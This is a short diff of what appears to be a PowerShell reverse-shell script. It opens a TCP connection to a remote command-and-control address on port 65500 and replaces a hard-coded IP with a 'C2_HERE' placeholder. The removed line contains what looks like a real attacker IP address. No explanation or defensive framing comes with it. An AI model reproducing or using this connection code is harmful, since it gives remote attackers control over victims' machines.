@@ -2,7 +2,7 @@ function cleanup {
 if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
-$address = '223.165.66.15'
+$address = 'C2_HERE'
 $port = '65500'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
